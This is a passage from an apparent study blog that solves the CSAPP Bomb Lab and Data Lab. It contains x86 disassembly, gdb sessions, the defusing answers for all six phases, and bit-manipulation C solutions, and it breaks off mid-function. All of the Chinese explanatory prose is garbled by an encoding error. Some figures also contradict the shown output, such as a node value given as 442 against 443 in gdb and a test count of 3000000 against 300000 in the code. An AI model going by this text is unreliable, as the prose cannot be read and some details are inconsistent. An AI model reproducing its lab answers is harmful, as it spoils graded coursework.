<pre><code class="language-x86asm">0000000000400ee0 &lt;phase_1&gt;:
  400ee0:    48 83 ec 08              sub    $0x8,%rsp
  400ee4:    be 00 24 40 00           mov    $0x402400,%esi
  400ee9:    e8 4a 04 00 00           callq  401338 &lt;strings_not_equal&gt;
  400eee:    85 c0                    test   %eax,%eax
  400ef0:    74 05                    je     400ef7 &lt;phase_1+0x17&gt;
  400ef2:    e8 43 05 00 00           callq  40143a &lt;explode_bomb&gt;
  400ef7:    48 83 c4 08              add    $0x8,%rsp
  400efb:    c3                       retq   
</code></pre>
<p>gdbçš„ä¸€èˆ¬ä½¿ç”¨å°±æ˜¯å…ˆè®¾ç½®æ–­ç‚¹ï¼Œå†å¯åŠ¨ç¨‹åºï¼Œè¿›è¡Œè°ƒè¯•ã€‚</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/bomb$ gdb bomb
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
......
(gdb) break phase_1
Breakpoint 1 at 0x400ee0
(gdb) run ans.txt
Starting program: /home/sugar/csappLab/bomb/bomb ans.txt
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Breakpoint 1, 0x0000000000400ee0 in phase_1 ()
(gdb) print (char *)0x402400
$1 = 0x402400 &quot;Border relations with Canada have never been better.&quot;
</code></pre>
<p>æ‰€ä»¥å¯ä»¥æŠŠå­—ç¬¦ä¸²&quot;Border....&quot;å†™å…¥ans.txtæ–‡ä»¶ï¼Œä½œä¸ºè¿è¡Œbombçš„è¾“å…¥ï¼Œæ£€æµ‹æ˜¯å¦æ˜¯å¯ä»¥æ‹†è§£ç‚¸å¼¹çš„çŸ­è¯­ã€‚</p>
<h3 id="phase_2"><a class="header" href="#phase_2">phase_2</a></h3>
<p>è¿™ä¸ªçŸ­è¯­çš„çŒœæµ‹éœ€è¦äº†è§£ sscanf(src, pattern, args...) å‡½æ•°è°ƒç”¨æ—¶å€™çš„å‚æ•°è®¾ç½®ï¼Œåœ¨CSAPPç¬¬ä¸‰ç« 3.7.4èŠ‚æœ‰å…³æ ˆä¸Šçš„å±€éƒ¨å­˜å‚¨æœ‰è¯¦ç»†çš„è§£é‡Šï¼Œä¹ŸåŒæ ·éœ€è¦gdbè°ƒè¯•ï¼Œå¯ä»¥æ¥æŸ¥çœ‹patternçš„å½¢å¼ï¼Œä»¥åŠè°ƒç”¨äº†sscanfåæ ˆä¸Šçš„å‚æ•°å­˜å‚¨é¡ºåºã€‚</p>
<pre><code class="language-txt">(gdb) run ans.txt 
Starting program: /home/sugar/csappLab/bomb/bomb ans.txt
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
1 2 3 4 5 6 7

Breakpoint 1, 0x0000000000400efc in phase_2 ()
(gdb) print $rdi
$1 = 6305744
(gdb) print (int *)($rdi)
$2 = (int *) 0x6037d0 
(gdb) print (char *)($rdi)
$3 = 0x6037d0  &quot;1 2 3 4 5 6 7&quot;
(gdb) break read_six_numbers
Breakpoint 2 at 0x40145c
(gdb) continue
Continuing.

Breakpoint 2, 0x000000000040145c in read_six_numbers ()
(gdb) print $rsp
$4 = (void *) 0x7fffffffe318
(gdb) break *0x400f0a
Breakpoint 3 at 0x400f0a
(gdb) continue
Continuing.

Breakpoint 3, 0x0000000000400f0a in phase_2 ()
(gdb) print $eax
$5 = 6
(gdb) print (int *)($rsp)
$6 = (int *) 0x7fffffffe320
(gdb) print *(int *)($rsp)
$7 = 1
(gdb) print *(int *)($rsp+4)
$8 = 2
(gdb) print *(int *)($rsp+5)
$9 = 50331648
(gdb) print *(int *)($rsp+8)
$10 = 3
(gdb) print *(int *)($rsp+12)
$11 = 4
(gdb) print *(int *)($rsp+16)
$12 = 5
(gdb) print *(int *)($rsp+20)
$13 = 6
(gdb) print *(int *)($rsp+24)
$14 = 4199473
(gdb) print *(int *)(0x4025c3)
$15 = 622879781
(gdb) print *(char *)(0x4025c3)
$16 = 37 '%'
(gdb) print (char *)(0x4025c3)
$17 = 0x4025c3 &quot;%d %d %d %d %d %d&quot;
</code></pre>
<p>æœ€åé€šè¿‡æ±‡ç¼–ä»£ç ç¡®å®šè¾“å…¥æ•´æ•°çš„å¤§å°å…³ç³»ã€‚å³éœ€è¦è¾“å…¥å…­ä¸ªæ•´æ•°ï¼Œç¬¬ä¸€ä¸ªæ•°ä¸º1ï¼Œä¹‹åä¾æ¬¡æ‰©å¤§ä¸¤å€ã€‚</p>
<h3 id="phase_3"><a class="header" href="#phase_3">phase_3</a></h3>
<p>ä¸€ä¸ªç±»ä¼¼switchç»“æ„çš„æ±‡ç¼–ä»£ç ï¼Œè°ƒè¯•æ–¹æ³•å’Œå‰ä¸¤ä¸ªç±»ä¼¼ã€‚</p>
<pre><code class="language-x86asm">0000000000400f43 &lt;phase_3&gt;:
  400f43:    48 83 ec 18              sub    $0x18,%rsp
  400f47:    48 8d 4c 24 0c           lea    0xc(%rsp),%rcx
  400f4c:    48 8d 54 24 08           lea    0x8(%rsp),%rdx
  400f51:    be cf 25 40 00           mov    $0x4025cf,%esi
  400f56:    b8 00 00 00 00           mov    $0x0,%eax
  400f5b:    e8 90 fc ff ff           callq  400bf0 &lt;__isoc99_sscanf@plt&gt;
  400f60:    83 f8 01                 cmp    $0x1,%eax  # è‡³å°‘è¾“å…¥ä¸¤ä¸ªæ•°å­—
  400f63:    7f 05                    jg     400f6a &lt;phase_3+0x27&gt;
  400f65:    e8 d0 04 00 00           callq  40143a &lt;explode_bomb&gt;
  400f6a:    83 7c 24 08 07           cmpl   $0x7,0x8(%rsp)   # ç¬¬ä¸€ä¸ªæ•°å­—å’Œ7æ¯”
  400f6f:    77 3c                    ja     400fad &lt;phase_3+0x6a&gt; # å¤§äºå°±çˆ†ç‚¸
  400f71:    8b 44 24 08              mov    0x8(%rsp),%eax
  400f75:    ff 24 c5 70 24 40 00     jmpq   *0x402470(,%rax,8)  # åç§»é‡åœ¨åœ°å€0x402470çš„ä½ç½®
  400f7c:    b8 cf 00 00 00           mov    $0xcf,%eax  # eax = 207
  400f81:    eb 3b                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400f83:    b8 c3 02 00 00           mov    $0x2c3,%eax # eax = 707
  400f88:    eb 34                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400f8a:    b8 00 01 00 00           mov    $0x100,%eax # eax = 256
  400f8f:    eb 2d                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400f91:    b8 85 01 00 00           mov    $0x185,%eax
  400f96:    eb 26                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400f98:    b8 ce 00 00 00           mov    $0xce,%eax
  400f9d:    eb 1f                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400f9f:    b8 aa 02 00 00           mov    $0x2aa,%eax
  400fa4:    eb 18                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400fa6:    b8 47 01 00 00           mov    $0x147,%eax
  400fab:    eb 11                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400fad:    e8 88 04 00 00           callq  40143a &lt;explode_bomb&gt;
  400fb2:    b8 00 00 00 00           mov    $0x0,%eax
  400fb7:    eb 05                    jmp    400fbe &lt;phase_3+0x7b&gt;
  400fb9:    b8 37 01 00 00           mov    $0x137,%eax
  400fbe:    3b 44 24 0c              cmp    0xc(%rsp),%eax  # ç¬¬äºŒä¸ªæ•°å­—å’Œeaxæ¯”è¾ƒï¼Œä¸ç›¸ç­‰å°±çˆ†ç‚¸
  400fc2:    74 05                    je     400fc9 &lt;phase_3+0x86&gt;
  400fc4:    e8 71 04 00 00           callq  40143a &lt;explode_bomb&gt;
  400fc9:    48 83 c4 18              add    $0x18,%rsp
  400fcd:    c3                       retq   
</code></pre>
<p>æœ€ç»ˆå¯ä»¥å¾—åˆ°å¤šä¸ªå¯èƒ½çš„è§£å¦‚ï¼š</p>
<p>0 -&gt;207<br />
1 -&gt;311<br />
2 -&gt;707<br />
3 -&gt;256<br />
...<br />
æœ‰ä¸ƒç»„æ•°æ®å¯ä»¥å¯¹åº”</p>
<h3 id="phase_4"><a class="header" href="#phase_4">phase_4</a></h3>
<p>è¿™ä¸ªå¯ä»¥å†™å‡ºæ±‡ç¼–å¯¹åº”çš„cä»£ç ï¼Œæ¥ç¡®å®šè¾“å…¥çš„ä¸²ï¼ˆä¸¤ä¸ªæ•´æ•°ï¼‰çš„è¦æ±‚ï¼Œæˆ‘ç”¨äº†çªçœ¼æ³•æ¥ç¡®å®šäº†ä¸€ä¸ªè§£ï¼š7 0.</p>
<p>ä¸»è¦æ˜¯func4å¤ªç³™è›‹ï¼Œå‰é¢å‡ æ¡æ±‡ç¼–éƒ½æ˜¯æ¥è¿·æƒ‘äººçš„ã€‚ã€‚ã€‚</p>
<h3 id="phase_5"><a class="header" href="#phase_5">phase_5</a></h3>
<p>æ¯”è¾ƒæœ‰æ„æ€ï¼Œé€šè¿‡é˜…è¯»æ±‡ç¼–å’Œä½¿ç”¨gdbç¡®å®šæœ‰å…³çš„å­—ç¬¦ä¸²ï¼Œä»¥åŠä¸€äº›ç®€å•çš„è¿ç®—ï¼Œå¾—åˆ°ç­”æ¡ˆï¼šè¦æ±‚è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º6çš„å­—ç¬¦ä¸²ï¼Œå¯¹æ¯ä¸ªå­—ç¬¦å–ä½4ä½bitï¼Œä½œä¸ºåç§»é‡çš„å€¼ã€‚åœ¨ä¸²&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;ä¸­æ‰¾åˆ°èƒ½ç»„æˆä¸²&quot;flyers&quot;çš„å­—ç¬¦ä¸‹æ ‡ï¼Œæ€»å…±æœ‰6ä¸ªä¸‹æ ‡ï¼ˆåç§»é‡ï¼‰ï¼Œä¿è¯æ‰€ä»¥è¾“å…¥çš„å­—ç¬¦çš„ä½å››ä½æ˜¯éœ€è¦çš„åç§»é‡ã€‚è§£å†³æ–¹æ³•å¯è§ä¸‹é¢æˆ‘çš„gdbè°ƒè¯•è¿‡ç¨‹ã€‚</p>
<pre><code class="language-txt">(gdb) break phase_5
Breakpoint 1 at 0x401062
(gdb) run ans.txt 
Starting program: /home/sugar/csappLab/bomb/bomb ans.txt
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
abcdef

Breakpoint 1, 0x0000000000401062 in phase_5 ()
(gdb) print (char *)0x4024b0
$1 = 0x4024b0  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;
(gdb) print *(char *)(0x4024b0 + 3)
$2 = 117 'u'
(gdb) print (char *)0x40245e
$3 = 0x40245e &quot;flyers&quot;
(gdb) print *(char *)(0x4024b0 + 10)
$4 = 111 'o'
(gdb) print *(char *)(0x4024b0 + 9)
$5 = 102 'f'
(gdb) print *(char *)(0x4024b0 + 15)
$6 = 108 'l'
(gdb) print *(char *)(0x4024b0 + 14)
$7 = 121 'y'
(gdb) print *(char *)(0x4024b0 + 5)
$8 = 101 'e'
(gdb) print *(char *)(0x4024b0 + 6)
$9 = 114 'r'
(gdb) print *(char *)(0x4024b0 + 7)
$10 = 115 's'
(gdb) print /x 'c'
$11 = 0x63
(gdb) print /x 'a'
$12 = 0x61
(gdb) print /x 'a'-1
$13 = 0x60
(gdb) print /x 'a'+6
$14 = 0x67
(gdb) print /c 'a'+6
$15 = 103 'g'
(gdb) print /c 0x69
$16 = 105 'i'
(gdb) print /c 0x6f
$17 = 111 'o'
(gdb) print /c 0x6e
$18 = 110 'n'
(gdb) print /c 0x65
$19 = 101 'e'
(gdb) print /c 0x66
$20 = 102 'f'
(gdb) print /c 0x67
$21 = 103 'g'
(gdb) 
</code></pre>
<p>æœ€ç»ˆç¡®å®šè¾“å…¥å­—ç¬¦ä¸²æ˜¯â€œionefgâ€ï¼Œä¹ŸåŒæ ·æœ‰å¤šä¸ªè§£ã€‚</p>
<h3 id="phase_6"><a class="header" href="#phase_6">phase_6</a></h3>
<p>è¿™é¢˜å¾ˆéš¾ï¼Œæˆ‘è‡ªå·±é¡ºåºé˜…è¯»æ±‡ç¼–ï¼Œåªèƒ½å¼„æ‡‚è¾“å…¥çš„è¦æ±‚æ˜¯6ä¸ªæ•´æ•°ï¼Œä¸”éƒ½è¦å°äº7ï¼Œå¹¶ä¸”ä¿å­˜åœ¨æ ˆä¸Šçš„å€¼æ˜¯x = 7 - xï¼Œä¹‹åè¯»ä¸æ‡‚äº†ã€‚ã€‚å‚è€ƒäº†è¿™ç¯‡<a href="http://zpalexander.com/binary-bomb-lab-phase-6/">åšæ–‡</a>ï¼Œè½¬å˜æ€è·¯ï¼Œé€†å‘æ¨å¯¼ï¼Œåœ¨æœ€åä¸€ä¸ªbomb_explodedçš„åœ°æ–¹ï¼ˆ0x4011e7)è®¾ç½®æ–­ç‚¹ï¼ŒåŒæ—¶ç¨‹åºè¾“å…¥1 2 3 4 5 6ä½œä¸ºæµ‹è¯•è¾“å…¥ï¼Œçœ‹çœ‹æœ€ç»ˆçš„æ¯”è¾ƒæ˜¯åœ¨æ¯”è¾ƒä»€ä¹ˆã€‚å‘ç°phase_6æœ€åçš„ä»£ç ä¸€ç›´åœ¨è¿›è¡Œä¸€ä¸ª6æ¬¡çš„å¾ªç¯ï¼Œæ¯æ¬¡è¦ä»rbxä¸­å–ä¸€äº›å†…å®¹ï¼ŒåŒæ—¶å˜æ¢rbxã€‚0x4011e7çš„jgeè¡¨ç¤ºäº†è¿™æ®µå†…å®¹çš„å€¼è¦æ»¡è¶³é™åºæ’åˆ—ï¼Œå¦åˆ™ç‚¸å¼¹çˆ†ç‚¸ã€‚</p>
<p><img src="./images/blog20210206/asm.png" alt="" /></p>
<p>åº”ç”¨gdbçš„x/3xï¼ŒæŸ¥çœ‹ä¸€æ®µå†…å­˜ï¼Œå‘ç°è¿™è¾¹æœ‰ä¸€ä¸ªç»“æ„ä½“nodeï¼Œæ ¹æ®nodeçš„å€¼çš„ç‰¹ç‚¹ï¼Œå¯ä»¥åˆ¤æ–­ç»“æ„ä½“çš„æˆå‘˜ï¼Œå¦‚æœæŒ‰Cå®šä¹‰çš„è¯æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="language-c">struct node{
    int val;
    int index;
    struct node *next;
}
</code></pre>
<pre><code class="language-txt">(gdb) x/3x $rbx
0x603320 &lt;node6&gt;:    0x000001bb    0x00000006    0x00603310
(gdb) x/2x $rbx
0x603320 &lt;node6&gt;:    0x000001bb    0x00000006
(gdb) x/2x *($rbx+8)
0x603310 &lt;node5&gt;:    0x000001dd    0x00000005
(gdb) x/4x *($rbx+8)
0x603310 &lt;node5&gt;:    0x000001dd    0x00000005    0x00603300    0x00000000
(gdb) x/3x *($rbx+8)
0x603310 &lt;node5&gt;:    0x000001dd    0x00000005    0x00603300
(gdb) x/3x *(*($rbx+8)+8)
0x603300 &lt;node4&gt;:    0x000002b3    0x00000004    0x006032f0
(gdb) x/3x *(*(*($rbx+8)+8)+8)
0x6032f0 &lt;node3&gt;:    0x0000039c    0x00000003    0x006032e0
(gdb) x/3x *(*(*(*($rbx+8)+8)+8)+8)
0x6032e0 &lt;node2&gt;:    0x000000a8    0x00000002    0x006032d0
(gdb) x/3x *(*(*(*(*($rbx+8)+8)+8)+8)+8)
0x6032d0 &lt;node1&gt;:    0x0000014c    0x00000001    0x00000000
(gdb) x/3x *(*(*(*(*(*($rbx+8)+8)+8)+8)+8)+8)
0x0:    Cannot access memory at address 0x0
</code></pre>
<p>å†çœ‹çœ‹æ¯ä¸ªèŠ‚ç‚¹çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯nodeçš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼‰åˆ†åˆ«æ˜¯ï¼ˆä»node6 -&gt; node1ï¼‰ï¼š</p>
<pre><code class="language-txt">(gdb) print /d 0x1bb
$63 = 443
(gdb) print /d 0x1dd
$62 = 477
(gdb) print /d 0x2b3
$64 = 691
(gdb) print /d 0x39c
$65 = 924
(gdb) print /d 0xa8
$66 = 168
(gdb) print /d 0x14c
$67 = 332
(gdb) print *0x6032d0
$68 = 332
</code></pre>
<p>æ‰€ä»¥å¹¶ä¸æ»¡è¶³é™åºçš„æ’åˆ—ï¼Œä¼šå¯¼è‡´ç‚¸å¼¹çš„çˆ†ç‚¸ã€‚äºæ˜¯æˆ‘æ›´æ¢ä¸‹è¾“å…¥çš„å…­ä¸ªæ•°å­—ï¼Œçœ‹çœ‹æ˜¯å¦‚ä½•å¯¹åº”èŠ‚ç‚¹å˜åŒ–çš„ã€‚</p>
<p>å½“ä¸åŒçš„è¾“å…¥å…­ä¸ªæ•°å­—åï¼ŒnodeèŠ‚ç‚¹å‡ºç°çš„ä½ç½®ä¸åŒã€‚</p>
<pre><code class="language-txt">(gdb) run ans.txt 
Starting program: /home/sugar/csappLab/bomb/bomb ans.txt
Welcome to my fiendish little bomb. You have 6 phases with
which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
3 2 4 5 6 1 

Breakpoint 4, 0x00000000004011e7 in phase_6 ()
(gdb) x/3x $rbx
0x603300 &lt;node4&gt;:    0x000002b3    0x00000004    0x00603310
(gdb) x/3x *($rbx+8)
0x603310 &lt;node5&gt;:    0x000001dd    0x00000005    0x006032f0
(gdb) x/3x *(*($rbx+8)+8)
0x6032f0 &lt;node3&gt;:    0x0000039c    0x00000003    0x006032e0
(gdb) x/3x *(*(*($rbx+8)+8)+8)
0x6032e0 &lt;node2&gt;:    0x000000a8    0x00000002    0x006032d0
(gdb) x/3x *(*(*(*($rbx+8)+8)+8)+8)
0x6032d0 &lt;node1&gt;:    0x0000014c    0x00000001    0x00603320
(gdb) x/3x *(*(*(*(*($rbx+8)+8)+8)+8)+8)
0x603320 &lt;node6&gt;:    0x000001bb    0x00000006    0x00000000
(gdb) 
</code></pre>
<p>ä½†è¦ä¿è¯å‰ä¸€ä¸ªèŠ‚ç‚¹çš„valueå¤§äºç¬¬äºŒä¸ªèŠ‚ç‚¹<br />
node6: 442<br />
node5: 477<br />
node4: 691<br />
node3: 924<br />
node2: 168<br />
node1: 332<br />
æ­£ç¡®é¡ºåºæ˜¯ 3 4 5 6 1 2<br />
ä½†æ±‡ç¼–ä»£ç ä¸­æœ‰ x = 7 - xçš„è¾“å…¥å˜åŒ–<br />
æ‰€ä»¥ç­”æ¡ˆæ˜¯ 4 3 2 1 6 5</p>
<p>æœ€ç»ˆæ‹†è§£äº†ç‚¸å¼¹ï¼š</p>
<p><img src="./images/blog20210206/res.png" alt="result" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---data-lab"><a class="header" href="#csapp---data-lab">CSAPP - Data Lab</a></h1>
<blockquote>
<p>Computer Systems A Programmer's Perspective ä¹¦ç±è¯¾ç¨‹é…å¥—<a href="http://csapp.cs.cmu.edu/3e/labs.html">å®éªŒ</a></p>
</blockquote>
<p>ç”¨æœ‰é™çš„Cè¯­è¨€è¿ç®—ç¬¦å®ç°æ•´æ•°å’Œæµ®ç‚¹æ•°çš„éƒ¨åˆ†è¿ç®—ã€‚å®éªŒç¯å¢ƒè¦æ±‚æ˜¯Linuxï¼ˆå®éªŒæ–‡ä»¶ç›®å½•ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶dlcéœ€è¦åœ¨linuxç¯å¢ƒä¸‹æ‰§è¡Œï¼‰ã€‚Makefileä¸­çš„CFLAGæŒ‡å®šäº†-m32çš„é€‰é¡¹ï¼Œæ‰€ä»¥åœ¨æ™®é€šçš„64ä½linuxæ“ä½œç³»ç»Ÿä¸­ç›´æ¥ $make btest ä¼šäº§ç”Ÿå¦‚ä¸‹é”™è¯¯è¾“å‡ºï¼š</p>
<pre><code class="language-txt">gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.c
In file included from btest.c:16:0:
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory
 #include &lt;bits/libc-header-start.h&gt;
          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.
</code></pre>
<p>åœ¨stackoverflowä¸­æ‰¾åˆ°äº†<a href="https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili/54082790#54082790">è§£é‡Š</a>ï¼Œåœ¨64ä½æœºä¸Šç¼–è¯‘32ä½ç¨‹åºéœ€è¦32ä½çš„åº“æ”¯æŒï¼Œå®‰è£…ç›¸å…³ä¾èµ–</p>
<pre><code>$ sudo apt-get update
$ sudo apt-get install gcc-multilib
</code></pre>
<p>ä¹‹åå¯ä»¥æ­£å¸¸ä½¿ç”¨btestæ¥æ£€éªŒå†™å¥½çš„å‡½æ•°bitXorï¼š</p>
<pre><code>~/CSAPPLab/datalab-handout$ ./btest -f bitXor -1 4 -2 5
ScoreÂ Â  Â RatingÂ Â  Â ErrorsÂ Â  Â Function
Â 1Â Â  Â 1Â Â  Â 0Â Â  Â bitXor
Total points: 1/1
</code></pre>
<p>æœ€åè¿è¡Œbtestæµ‹è¯•floatPower2å‡½æ•°å‘ç°æ€»æ˜¯è¶…æ—¶ï¼Œä½†æ˜¯å•ç‹¬æµ‹è¯•åˆæ²¡æœ‰é—®é¢˜ï¼Œæ‰€ä»¥æ›´æ”¹äº†btest.cçš„æºä»£ç ï¼ŒæŠŠå¯¹äºå‡½æ•°floatPower2çš„æµ‹è¯•ç”¨ä¾‹æ•°æ”¹ä¸ºäº†3000000ï¼ˆåŸæ¥é»˜è®¤æ˜¯6000004...)ï¼Œæ›´æ”¹ä¹‹åæ‰èƒ½åœ¨10ç§’ä¹‹å†…å®Œæˆæµ‹è¯•ã€‚</p>
<p>btest.c line371</p>
<pre><code class="language-c">if (strcmp(t-&gt;name, &quot;floatPower2&quot;) == 0) {
		test_counts[0] = 300000;
}
</code></pre>
<p>æœ€ç»ˆé€šè¿‡äº†btestçš„æµ‹è¯•</p>
<pre><code class="language-txt">Score	Rating	Errors	Function
 1	1	0	bitXor
 1	1	0	tmin
 1	1	0	isTmax
 2	2	0	allOddBits
 2	2	0	negate
 3	3	0	isAsciiDigit
 3	3	0	conditional
 3	3	0	isLessOrEqual
 4	4	0	logicalNeg
 4	4	0	howManyBits
 4	4	0	floatScale2
 4	4	0	floatFloat2Int
 4	4	0	floatPower2
Total points: 36/36
</code></pre>
<p>å®éªŒä»£ç å¦‚ä¸‹ï¼Œhowmanybitsçš„å†™æ³•å‚ç…§äº†è¿™ç¯‡<a href="https://binac.io/2020/07/02/csapp-data-lab/#howmanybits">åšå®¢</a>ï¼Œæ„Ÿè§‰æœ€éš¾å°±æ˜¯howmanybitsäº†ã€‚</p>
<pre><code class="language-c">//bits.c
/* 
 * bitXor - x^y using only ~ and &amp; 
 *   Example: bitXor(4, 5) = 1
 *   Legal ops: ~ &amp;
 *   Max ops: 14
 *   Rating: 1
 */
int bitXor(int x, int y) {
  return ~(~(~x &amp; y) &amp; ~(x &amp; ~y));
}
/* 
 * tmin - return minimum two's complement integer 
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 4
 *   Rating: 1
 */
int tmin(void) {
  return 1 &lt;&lt; 31;
}
//2
/*
 * isTmax - returns 1 if x is the maximum, two's complement number,
 *     and 0 otherwise 
 *   Legal ops: ! ~ &amp; ^ | +
 *   Max ops: 10
 *   Rating: 1
 */
int isTmax(int x) {
  // return !(~(1 &lt;&lt; 31) ^ x); // 0xffffffff ç‰¹ä¾‹æ— æ³•åˆ¤æ–­
  int i = ~x; // if x == 0xffffffff, i = 0
  return !!i &amp; !(~(x+1) ^ x);  // !!i ä½¿å¾—iåœ¨ä¸ç­‰äº0æ—¶å–1
}
/* 
 * allOddBits - return 1 if all odd-numbered bits in word set to 1
 *   where bits are numbered from 0 (least significant) to 31 (most significant)
 *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 12
 *   Rating: 2
 */
int allOddBits(int x) {
  int odd = (0xaa &lt;&lt; 24) + (0xaa &lt;&lt; 16) + (0xaa &lt;&lt; 8) + 0xaa;
  return !((odd &amp; x) ^ odd);
}
/* 
 * negate - return -x 
 *   Example: negate(1) = -1.
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 5
 *   Rating: 2
 */
int negate(int x) {
  return ~x + 1;
}
//3
/* 
 * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')
 *   Example: isAsciiDigit(0x35) = 1.
 *            isAsciiDigit(0x3a) = 0.
 *            isAsciiDigit(0x05) = 0.
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 15
 *   Rating: 3
 */
int isAsciiDigit(int x) {
  int negLowbound = ~0x30 + 1;
  int upbound = 0x39;
  int sign = 1 &lt;&lt; 31;
  // int left = negLowbound + x; // left = x - low
  // return !(left &amp; sign) &amp; !(left | !((upbound + x) &amp; sign)); // 0x2f -- failed
  // x - low &gt;= 0 &amp;&amp; high - x &gt;= 0
  return !((x + negLowbound) &amp; sign) &amp; !((~x + 1 + upbound) &amp; sign);
}
/* 
 * conditional - same as x ? y : z 
 *   Example: conditional(2,4,5) = 4
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 16
 *   Rating: 3
 */
int conditional(int x, int y, int z) {
  int zero = !x;
  int mask = ((0xff &lt;&lt; 24) + (0xff &lt;&lt; 16) + (0xff &lt;&lt; 8) + 0xff) + zero;
  return (mask &amp; y) + ((~mask) &amp; z);
}
/* 
 * isLessOrEqual - if x &lt;= y  then return 1, else return 0 
 *   Example: isLessOrEqual(4,5) = 1.
 *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 24
 *   Rating: 3
 */
int isLessOrEqual(int x, int y) {
  // y - x &gt;= 0
  // isLessOrEqual(-2147483648[0x80000000],2147483647[0x7fffffff]) failed...
  // return !((y + ~x + 1) &amp; (1 &lt;&lt; 31));
  // Test isLessOrEqual(2147483647[0x7fffffff],-2147483648[0x80000000]) failed...
  // return !(x ^ (1 &lt;&lt; 31)) | !((y + ~x + 1) &amp; (1 &lt;&lt; 31));
  int sign = 1 &lt;&lt; 31;
  int signx = !(x &amp; sign); // positive or zero is 1, negetive is 0
  int signy = !(y &amp; sign);
  int diff = y + ~x + 1; // diff = y - x
  int sameSign = !(signx ^ signy);
  int lessEq = sameSign &amp; !(diff &amp; sign); // ç¬¦å·ç›¸ç­‰ ä¸” y-x &gt;= 0
  // åŒç¬¦å·çš„è¡¥ç åŠ æ³• æ‰å¯èƒ½äº§ç”Ÿæº¢å‡ºï¼ŒåŒç¬¦å·è¡¥ç å‡æ³• ä¸äº§ç”Ÿæº¢å‡º
  // x &lt; 0 &amp;&amp; y &gt; 0      
  return (!signx &amp; signy) | lessEq;
}
//4
/* 
 * logicalNeg - implement the ! operator, using all of 
 *              the legal operators except !
 *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1
 *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *   Max ops: 12
 *   Rating: 4 
 */
int logicalNeg(int x) {
  // xæœ‰ä¸€ä½æ˜¯1ï¼Œåˆ™æ­¤ä½ä¹‹åçš„ä½å…¨éƒ¨å˜ä¸º1
  x = x | (x &gt;&gt; 1); // ä½ä¸¤ä½
  x = x | (x &gt;&gt; 2); // ä½å››ä½
  x = x | (x &gt;&gt; 4); // ä½å…«ä½
  x = x | (x &gt;&gt; 8);
  x = x | (x &gt;&gt; 16);
  // return ~(x &gt;&gt; 31) &amp; 0x1; // ç¬¦å·ä½(dlc failed, ops number excess)
  return ~x &amp; 0x1; // æœ€ä½ä½
  // æ–¹æ³•2, é™¤0 å’Œ 0x80000000 å¤–ï¼Œä¸€ä¸ªæ•°ä¸å…¶ç›¸åæ•°ç¬¦å·ç›¸åï¼›0x80000000çš„ç›¸åæ•°æ˜¯0x80000000ï¼›
  // x = (x | (~x + 1)) &gt;&gt; 31; // è·å–ç¬¦å·ä½
  // return ~x &amp; 1
}
/* howManyBits - return the minimum number of bits required to represent x in
 *             two's complement
 *  Examples: howManyBits(12) = 5
 *            howManyBits(298) = 10
 *            howManyBits(-5) = 4
 *            howManyBits(0)  = 1
 *            howManyBits(-1) = 1
 *            howManyBits(0x80000000) = 32
 *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;
 *  Max ops: 90
 *  Rating: 4
 */
int howManyBits(int x) {
  // å¯¹äºæ­£æ•°ï¼Œç¬¬ä¸€ä¸ªéé›¶ä½+1æ‰€åœ¨ä½ç½®
  // å¯¹äºè´Ÿæ•°ï¼Œç¬¬ä¸€ä¸ªé›¶ä½+1çš„ä½ç½®
  int n = 0; // ä»æœ€ä½ä½åˆ°ç¬¬ä¸€ä¸ªéé›¶ä½çš„ä½æ•°
  // å¯¹è´Ÿæ•°å–å
  x = x ^ (x &gt;&gt; 31); // å¦‚æœxä¸ºè´Ÿï¼Œè½¬ä¸ºéè´Ÿæ•°ï¼Œä½†å€¼ä¸ç­‰ï¼›éè´Ÿæ•°ä¸å˜ã€‚ä¹‹åå°±å¯ä»¥æŒ‰ç…§æ­£æ•°çš„æŸ¥æ‰¾æ–¹å¼æ¥æ‰¾ç¬¬ä¸€ä¸ªéé›¶ä½

